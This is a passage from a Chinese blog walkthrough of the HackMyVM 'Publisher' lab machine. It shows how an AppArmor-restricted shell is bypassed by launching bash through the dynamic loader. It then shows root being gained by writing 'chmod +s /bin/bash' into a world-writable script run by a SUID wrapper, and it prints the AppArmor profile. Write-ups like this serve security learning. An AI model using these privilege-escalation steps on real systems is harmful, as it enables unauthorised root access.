+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">think@publisher:~$ cat /opt/run_container.sh
+</span></span><span class="line"><span class="cl">cat: /opt/run_container.sh: Permission denied
+</span></span><span class="line"><span class="cl">think@publisher:~$ ls -la /opt/run_container.sh
+</span></span><span class="line"><span class="cl">-rwxrwxrwx 1 root root 1715 Mar 29  2024 /opt/run_container.sh
+</span></span><span class="line"><span class="cl">think@publisher:~$ ls -la /opt
+</span></span><span class="line"><span class="cl">ls: cannot open directory &#39;/opt&#39;: Permission denied
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>哎nmd，运行一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-zed" data-lang="zed"><span class="line"><span class="cl"><span class="n">think</span><span class="err">@</span><span class="n">publisher</span><span class="o">:~</span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="nn">opt/</span><span class="n">run_container</span><span class="p">.</span><span class="n">sh</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">permission</span><span class="w"> </span><span class="n">denied</span><span class="w"> </span><span class="n">while</span><span class="w"> </span><span class="n">trying</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Docker</span><span class="w"> </span><span class="n">daemon</span><span class="w"> </span><span class="n">socket</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">unix</span><span class="o">:</span><span class="c1">///var/run/docker.sock: Get &#34;http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1&#34;: dial unix /var/run/docker.sock: connect: permission denied
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">docker</span><span class="o">:</span><span class="w"> </span><span class="kd">permission</span><span class="w"> </span><span class="n">denied</span><span class="w"> </span><span class="n">while</span><span class="w"> </span><span class="n">trying</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Docker</span><span class="w"> </span><span class="n">daemon</span><span class="w"> </span><span class="n">socket</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">unix</span><span class="o">:</span><span class="c1">///var/run/docker.sock: Post &#34;http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/create&#34;: dial unix /var/run/docker.sock: connect: permission denied.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">See</span><span class="w"> </span><span class="err">&#39;</span><span class="n">docker</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="o">--</span><span class="n">help</span><span class="err">&#39;</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">List</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">Docker</span><span class="w"> </span><span class="n">containers</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">permission</span><span class="w"> </span><span class="n">denied</span><span class="w"> </span><span class="n">while</span><span class="w"> </span><span class="n">trying</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Docker</span><span class="w"> </span><span class="n">daemon</span><span class="w"> </span><span class="n">socket</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">unix</span><span class="o">:</span><span class="c1">///var/run/docker.sock: Get &#34;http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1&#34;: dial unix /var/run/docker.sock: connect: permission denied
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Enter</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">ID</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">container</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">leave</span><span class="w"> </span><span class="n">blank</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">one</span><span class="o">:</span><span class="w"> 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>啊这，这个玩意是docker的，还要输入一个id，该怎么办呢，不会了，这是easy难度啊我靠</p>
+<p>按照作者思路，你先要发现这玩意你连上的不是bash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">think@publisher:~$ env
+</span></span><span class="line"><span class="cl">SHELL=/usr/sbin/ash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以我们要去生成一个<code>bash shell</code>，比如前面<code>/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2 /bin/bash</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">think@publisher:/usr/lib64$ ls -la
+</span></span><span class="line"><span class="cl">total 8
+</span></span><span class="line"><span class="cl">drwxr-xr-x  2 root root 4096 Dec  8  2023 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 14 root root 4096 Feb 23  2022 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  1 root root   32 Nov 22  2023 ld-linux-x86-64.so.2 -&gt; /lib/x86_64-linux-gnu/ld-2.31.so  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>权限是满的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">think@publisher:/$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
+</span></span><span class="line"><span class="cl">think@publisher:/$ 
+</span></span><span class="line"><span class="cl">think@publisher:/$ <span class="nb">echo</span> <span class="s1">&#39;#!/bin/bash&#39;</span> &gt; /opt/run_container.sh
+</span></span><span class="line"><span class="cl">think@publisher:/$ <span class="nb">echo</span> <span class="s1">&#39;chmod +s /bin/bash&#39;</span> &gt;&gt; /opt/run_container.sh
+</span></span><span class="line"><span class="cl">think@publisher:/$ /usr/sbin/run_container
+</span></span><span class="line"><span class="cl">think@publisher:/$ cat /opt/run_container.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">chmod +s /bin/bash
+</span></span><span class="line"><span class="cl">think@publisher:/$ bash -p  
+</span></span><span class="line"><span class="cl">bash-5.0# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>think<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>think<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>think<span class="o">)</span>
+</span></span><span class="line"><span class="cl">bash-5.0# 
+</span></span><span class="line"><span class="cl">ntainers: 
+</span></span><span class="line"><span class="cl">bash-5.0# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="为什么opt不可以访问呢">为什么OPT不可以访问呢？</h3>
+<p>首先我们的<code>shell</code>是<code>ASH</code></p>
+<p>其次是<code>apparmor</code> 限制了，<code>apparmor</code> 可以对程序进行访问控制，靶机里就是限制呢我们的<code>shell</code> <code>ASH</code> ，下面是对ASH限制的配置文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span> <span class="n">cd</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apparmor</span><span class="p">.</span><span class="n">d</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span> <span class="n">ls</span>
+</span></span><span class="line"><span class="cl"><span class="n">abi</span>           <span class="n">disable</span>         <span class="n">local</span>        <span class="n">nvidia_modprobe</span>  <span class="n">tunables</span>     <span class="n">usr</span><span class="p">.</span><span class="n">sbin</span><span class="p">.</span><span class="n">ash</span>       <span class="n">usr</span><span class="p">.</span><span class="n">sbin</span><span class="p">.</span><span class="n">mysqld</span>    <span class="n">usr</span><span class="p">.</span><span class="n">sbin</span><span class="p">.</span><span class="n">tcpdump</span>
+</span></span><span class="line"><span class="cl"><span class="n">abstractions</span>  <span class="n">force</span><span class="o">-</span><span class="n">complain</span>  <span class="n">lsb_release</span>  <span class="n">sbin</span><span class="p">.</span><span class="n">dhclient</span>    <span class="n">usr</span><span class="p">.</span><span class="n">bin</span><span class="p">.</span><span class="n">man</span>  <span class="n">usr</span><span class="p">.</span><span class="n">sbin</span><span class="p">.</span><span class="n">ippusbxd</span>  <span class="n">usr</span><span class="p">.</span><span class="n">sbin</span><span class="p">.</span><span class="n">rsyslogd</span>
+</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span> <span class="n">cat</span> <span class="n">usr</span><span class="p">.</span><span class="n">sbin</span><span class="p">.</span><span class="n">ash</span> 
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;tunables/global&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">ash</span> <span class="n">flags</span><span class="o">=</span><span class="p">(</span><span class="n">complain</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">#include</span> <span class="cpf">&lt;abstractions/base&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="cp">#include</span> <span class="cpf">&lt;abstractions/bash&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="cp">#include</span> <span class="cpf">&lt;abstractions/consoles&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="cp">#include</span> <span class="cpf">&lt;abstractions/nameservice&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="cp">#include</span> <span class="cpf">&lt;abstractions/user-tmp&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">  <span class="cp"># Remove specific file path rules
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="cp"># Deny access to certain directories
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="n">deny</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span> <span class="n">r</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">deny</span> <span class="o">/</span><span class="n">opt</span><span class="cm">/** rwx,
+</span></span></span><span class="line"><span class="cl"><span class="cm">  /usr/bin/** mrix,
+</span></span></span><span class="line"><span class="cl"><span class="cm">  /usr/sbin/** mrix,
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">  # Simplified rule for accessing /home directory
+</span></span></span><span class="line"><span class="cl"><span class="cm">  owner /home/** rwix,
+</span></span></span><span class="line"><span class="cl"><span class="cm">}
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到是 <code>deny /opt/ r</code>  <code>deny /opt/** rwx</code>，限制了我们对<code>OPT</code>文件夹里边的文件的所有权限</p>
+<p>因此我们通过动态链接库回到 <code>bash</code> 环境后，改配置文件就对我们不起效了</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-03-05</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hmv_publisher/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://www.zhuangsanmeng.xyz/hmv_publisher/" data-title="HMV publisher" data-hashtags="渗透"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://www.zhuangsanmeng.xyz/hmv_publisher/" data-hashtag="渗透"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://www.zhuangsanmeng.xyz/hmv_publisher/" data-title="HMV publisher"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://www.zhuangsanmeng.xyz/hmv_publisher/" data-title="HMV publisher"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://www.zhuangsanmeng.xyz/hmv_publisher/" data-title="HMV publisher"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hmv_hackingtoys/" class="prev" rel="prev" title="HMV HackingToys"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HMV HackingToys</a>
+            <a href="/hmv_smol/" class="next" rel="next" title="HMV Smol">HMV Smol<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src=''></script>
+
+    <script type="text/javascript">
+        new Valine({
+            el: '#valine',
+            appId: 'XiJ1G58psCdX6BgfE27O7IH9-MdYXbMMI',
+            appKey: 'e9j5fWZui0l2YfNwupu7SDW2',
+            notify: '',
+            verify: '',
+            avatar: 'mp',
+            placeholder: '留下你的评论～',
+            visitor: 'true'
+        });
+    </script></div></article></div>
+            </main><footer class="footer">
+    <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer"
+                title="Hugo 0.147.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank"
+                rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw"
+                    aria-hidden="true"></i> LoveIt</a>
+        </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a
+                    href="/" target="_blank">Zsm</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br" />
+            <span class="icp">豫ICP备2024048128号</span></div>
+    
+        
+        <script async src=" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js "></script>
+    
+
+    
+        
+            <section>
+                
+                    <span id="busuanzi_container_value_site_pv"><i class="far fa-eye fa-fw"></i>
+                        
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+
+                
+                    &nbsp;|&nbsp;              
+                
+
+                
+                    <span id="busuanzi_container_value_site_uv"><i class="fa fa-user"></i>
+                        
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+            </section>
+        
+
+        
+        
+    
+
+</div>
+</footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
